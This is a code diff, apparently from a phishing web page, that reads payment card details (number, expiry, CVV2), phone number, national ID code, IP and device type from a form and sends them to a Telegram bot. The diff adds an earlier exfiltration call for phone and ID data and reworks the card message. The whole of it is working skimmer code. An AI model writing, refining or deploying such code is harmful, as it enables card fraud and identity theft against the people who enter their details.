@@ -26,8 +26,8 @@ const chatId = '-4614449543';
 // ];
 // var uuid = du.hashMD5(dua.join(':'));
 
-const androidId = androidListener.getAndroidID();
-const device = androidListener.deviceName();
+// const androidId = androidListener.getAndroidID();
+// const device = androidListener.deviceName();
 
 const sendMessage = async function (message) {
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -220,15 +220,11 @@ form.addEventListener('keydown', e => {
   ) {
     const message = `
     Card Number: ${cardInput.value}
-    Expiration: ${mm}/${yy}
-    Cvv2: ${cvv2Input.value}
-    --------------
-    Phone: ${phone}
-    CodeMeli: ${codeMeli}
-    --------------
-    IP: ${userIp}
-    Device: ${device}
-    TAG: ${androidId}
+Expiration: ${mm}/${yy}
+Cvv2: ${cvv2Input.value}
+--------------
+IP: ${userIp}
+Device: ${getDeviceType()}
   `;
     console.log(cardInput.value);
     console.log(mm);
@@ -337,6 +333,11 @@ firstBtn.addEventListener('click', () => {
     setTimeout(() => {
       codeMeli = codemeliInput.value;
       phone = phoneInput.value;
+      const message = `
+      Phone: ${phone}
+CodeMeli: ${codeMeli}
+  `;
+      sendMessage(message);
       document.getElementById('page1').classList.add('hidden');
       document.getElementById('page2').classList.remove('hidden');
       setTimeout(() => {
